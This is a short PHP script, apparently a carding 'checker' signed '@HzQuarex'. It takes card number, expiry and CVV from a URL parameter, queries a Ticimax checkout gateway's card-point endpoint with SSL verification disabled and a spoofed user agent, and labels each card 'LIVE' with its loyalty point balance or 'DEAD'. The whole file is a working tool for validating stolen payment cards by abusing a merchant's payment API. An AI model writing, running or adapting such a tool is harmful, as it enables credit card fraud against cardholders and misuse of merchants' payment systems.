<?php
header('Content-Type: text/plain');

if (!isset($_GET['card'])) {
    echo '❌ DEAD => No card provided';
    exit;
}

$card = $_GET['card'];
$parts = explode('|', $card);
if (count($parts) !== 4) {
    echo "❌ DEAD => $card => Geçersiz format";
    exit;
}

[$cc, $month, $year, $cvv] = $parts;
$lid = '45542'; // Sabit LİD değeri

$url = "https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=$cc&month=$month&year=$year&cvv=$cvv&lid=$lid";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");

$response = curl_exec($ch);
$error = curl_error($ch);
curl_close($ch);

if ($response === false) {
    echo "❌ DEAD => $card => API bağlantı hatası: $error";
    exit;
}

$data = json_decode($response, true);
if (isset($data['point']) && is_numeric($data['point'])) {
    $puan = $data['point'];
    echo "✅ LIVE ➜ $card ➜ ✅ Approved | MAXIPUAN: $puan TL @HzQuarex";
} else {
    echo "❌ DEAD => $card";
}
?>
